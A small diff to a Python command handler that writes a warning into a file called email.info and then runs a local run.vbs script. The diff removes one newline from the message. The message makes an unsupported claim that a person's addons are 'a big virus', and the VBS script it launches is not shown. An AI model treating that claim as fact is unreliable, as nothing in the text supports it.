@@ -25,7 +25,7 @@ def cmd_answer(comd):
     elif comd == 'sc_pl':
         em = open('email.info', 'w')
         em.truncate(0)
-        em.write("if you reading this, it means that you now that you can stop this BIGGEST mistake.\n"
+        em.write("if you reading this, it means that you now that you can stop this BIGGEST mistake."
                  "You will delete Joe's part that is virus on your PC. His addons are parts of big virus. If you will not stop him, it's will be too late. good luck.")
         em.close()
         os.system('run.vbs')
